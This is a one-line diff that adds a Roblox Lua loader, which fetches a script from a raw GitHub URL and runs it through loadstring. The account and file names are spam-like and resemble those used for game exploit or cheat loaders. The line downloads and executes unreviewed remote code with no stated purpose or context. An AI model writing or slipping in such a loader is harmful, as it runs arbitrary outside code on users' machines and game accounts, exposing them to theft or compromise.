@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/vanguards-2nd-anniversary-spam7-chq75usyoaxhrk.lua"))()
